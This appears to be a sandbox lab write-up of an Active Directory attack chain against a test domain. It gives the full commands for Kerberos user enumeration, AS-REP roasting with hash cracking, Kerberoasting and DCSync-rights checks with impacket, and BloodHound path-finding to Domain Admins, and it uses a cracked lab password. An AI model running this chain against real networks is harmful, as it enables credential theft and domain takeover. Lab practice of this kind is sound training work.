### NMAP 
```bash
# scanning port 88 shows Kerberos is reachable
nmap -p 88 192.168.100.1
```
![nmap](/Sandbox_SecurityLab_1/block1-attacks/src/nmap_res.jpg)
### User enumeration
```bash
kerbrute userenum -d corpnet.local --dc 192.168.100.1 usernames.txt -o valid_users.txt
```
![kerbrute](/Sandbox_SecurityLab_1/block1-attacks/src/kerbrute_res.jpg)

### AS-REP Roasting Check
```bash
impacket-GetNPUsers corpnet.local/ -usersfile valid_users.txt -dc-ip 192.168.100.1 -format hashcat -no-pass -outputfile asrep_hashes.txt
```
![GetNPUsers](/Sandbox_SecurityLab_1/block1-attacks/src/asrep_check.jpg)

```bash
# crack the hash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```
![hashcat](/Sandbox_SecurityLab_1/block1-attacks/src/hashcat_get_pass.jpg)

### ASP Users Check (Kerberoasting candidates)
```bash
impacket-GetUserSPNs corpnet.local/j.melnyk:'P@ssw0rd123' -dc-ip 192.168.100.1
```
![GetUserSPNs](/Sandbox_SecurityLab_1/block1-attacks/src/Get_SPN_users.jpg)

### DCSync Check (Replication rights on the Domain object)
```bash
impacket-dacledit -action read -target-dn "DC=corpnet,DC=local" corpnet.local/j.melnyk:'P@ssw0rd123' -dc-ip 192.168.100.1
```
![dacledit](/Sandbox_SecurityLab_1/block1-attacks/src/DCSync_check.jpg)

### Bloodhound
```bash
bloodhound-python -u j.melnyk -p 'P@ssw0rd123' -d corpnet.local -ns 192.168.100.1 -c All

bloodhound-setup

bloodhound-start

# Web UI: http//localhost:8080
```
Shortest path to Domain Admins

![bloodhound1](/Sandbox_SecurityLab_1/block1-attacks/src/Tree.jpg)

Kerberoasting candidate

![bloodhound2](/Sandbox_SecurityLab_1/block1-attacks/src/Kerberoastable_user.jpg)

AS-REP Roastable user

![bloodhound3](/Sandbox_SecurityLab_1/block1-attacks/src/AS-REP_user.jpg)

User with Replicating Rights

![bloodhound4](/Sandbox_SecurityLab_1/block1-attacks/src/RepRights_user.jpg)